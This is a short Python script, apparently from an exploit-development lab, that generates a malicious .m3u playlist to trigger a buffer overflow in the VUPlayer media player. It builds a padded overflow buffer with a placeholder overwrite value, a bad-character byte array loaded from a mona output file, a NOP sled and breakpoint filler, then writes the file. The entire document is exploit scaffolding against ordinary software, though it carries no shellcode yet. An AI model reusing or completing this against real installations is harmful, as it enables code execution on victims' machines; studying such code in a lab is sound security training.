#!/usr/bin/python3
from pwn import *

buffer = b"A" * 1005
buffer += b"BBBB"
buffer += open('/home/exploiter/shared/Mona_Shared/VUPlayer/bytearray.bin','rb').read()
buffer += b"\x90"*20
buffer += b"\xCC" * (5000-len(buffer))

data = b'HTTP://' + buffer 

print("[+]Length Buffer: " + str(len(buffer)))
f = open('offset.m3u','wb')
f.write(data)
f.close()